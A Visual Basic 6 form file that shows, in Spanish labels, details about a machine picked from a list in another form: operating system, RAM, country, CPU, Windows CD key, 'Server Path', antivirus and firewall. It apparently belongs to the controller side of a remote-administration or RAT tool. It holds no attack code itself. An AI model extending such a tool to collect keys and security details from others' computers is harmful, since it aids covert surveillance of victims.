VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Begin VB.Form Form2 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "System Info"
   ClientHeight    =   4875
   ClientLeft      =   45
   ClientTop       =   345
   ClientWidth     =   6525
   Icon            =   "Form2.frx":0000
   LinkTopic       =   "Form2"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4875
   ScaleWidth      =   6525
   StartUpPosition =   2  'CenterScreen
   Begin MSComctlLib.ImageList ImageList1 
      Left            =   2280
      Top             =   2160
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   16
      ImageHeight     =   16
      MaskColor       =   12632256
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   17
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form2.frx":058A
            Key             =   ""
         EndProperty
         BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form2.frx":0B24
            Key             =   ""
         EndProperty
         BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form2.frx":10BE
            Key             =   ""
         EndProperty
         BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form2.frx":1412
            Key             =   ""
         EndProperty
         BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form2.frx":19AC
            Key             =   ""
         EndProperty
         BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form2.frx":1F46
            Key             =   ""
         EndProperty
         BeginProperty ListImage7 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form2.frx":24E0
            Key             =   ""
         EndProperty
         BeginProperty ListImage8 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form2.frx":2A7A
            Key             =   ""
         EndProperty
         BeginProperty ListImage9 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form2.frx":3014
            Key             =   ""
         EndProperty
         BeginProperty ListImage10 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form2.frx":35AE
            Key             =   ""
         EndProperty
         BeginProperty ListImage11 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form2.frx":3B48
            Key             =   ""
         EndProperty
         BeginProperty ListImage12 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form2.frx":40E2
            Key             =   ""
         EndProperty
         BeginProperty ListImage13 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form2.frx":4436
            Key             =   ""
         EndProperty
         BeginProperty ListImage14 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form2.frx":478A
            Key             =   ""
         EndProperty
         BeginProperty ListImage15 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form2.frx":4D24
            Key             =   ""
         EndProperty
         BeginProperty ListImage16 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form2.frx":52BE
            Key             =   ""
         EndProperty
         BeginProperty ListImage17 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form2.frx":5858
            Key             =   ""
         EndProperty
      EndProperty
   End
   Begin MSComctlLib.ListView ListView1 
      Height          =   4815
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   6495
      _ExtentX        =   11456
      _ExtentY        =   8493
      View            =   3
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      FullRowSelect   =   -1  'True
      _Version        =   393217
      Icons           =   "ImageList1"
      SmallIcons      =   "ImageList1"
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   1
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      NumItems        =   2
      BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Text            =   "Description"
         Object.Width           =   4057
      EndProperty
      BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   1
         Text            =   "Information"
         Object.Width           =   7234
      EndProperty
   End
End
Attribute VB_Name = "Form2"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Sub Form_Load()
On Error Resume Next
Me.Caption = "Información de " & Form1.LV.SelectedItem

ListView1.ListItems.Add , , "Sistema Operativo", 1, 1
ListView1.ListItems.Add , , "Sección", 2, 2
ListView1.ListItems.Add , , "RAM", 3, 3
ListView1.ListItems.Add , , "Service Pack", 4, 4
ListView1.ListItems.Add , , "Versión", 5, 5
ListView1.ListItems.Add , , "Fecha Local", 6, 6
ListView1.ListItems.Add , , "Hora Local", 7, 7
ListView1.ListItems.Add , , "PC Uptime", 8, 8
ListView1.ListItems.Add , , "CD Key", 9, 9
ListView1.ListItems.Add , , "Pais", 10, 10
ListView1.ListItems.Add , , "Server Path", 11, 11
ListView1.ListItems.Add , , "CPU", 12, 12
ListView1.ListItems.Add , , "Lenguaje", 13, 13
ListView1.ListItems.Add , , "Windows Dir", 14, 14
ListView1.ListItems.Add , , "System Dir", 15, 15
ListView1.ListItems.Add , , "Antivirus", 16, 16
ListView1.ListItems.Add , , "Firewall", 17, 17
Dim nam() As String
nam = Split(Form1.LV.SelectedItem.SubItems(2), "/")
ListView1.ListItems(1).SubItems(1) = nam(0)
ListView1.ListItems(2).SubItems(1) = nam(1)
Form2.ListView1.ListItems(3).SubItems(1) = Form1.LV.SelectedItem.SubItems(3)
'Form2.ListView1.ListItems(4).SubItems(1) = service pack
Form2.ListView1.ListItems(5).SubItems(1) = Form1.LV.SelectedItem.SubItems(5)
'Form2.ListView1.ListItems(6).SubItems(1) = fecha
'Form2.ListView1.ListItems(7).SubItems(1) = hora
'Form2.ListView1.ListItems(8).SubItems(1) = pcuptime
'Form2.ListView1.ListItems(9).SubItems(1) = WINDowsID
Form2.ListView1.ListItems(10).SubItems(1) = Form1.LV.SelectedItem.SubItems(4)
'Form2.ListView1.ListItems(11).SubItems(1) =serverpath
Form2.ListView1.ListItems(12).SubItems(1) = Form1.LV.SelectedItem.SubItems(6)
'Form2.ListView1.ListItems(13).SubItems(1) =Idioma
'Form2.ListView1.ListItems(14).SubItems(1) =WINDIR
'Form2.ListView1.ListItems(15).SubItems(1) =systemdir
End Sub


Private Sub Form_Unload(Cancel As Integer)
Form1.Show
Unload Me
End Sub
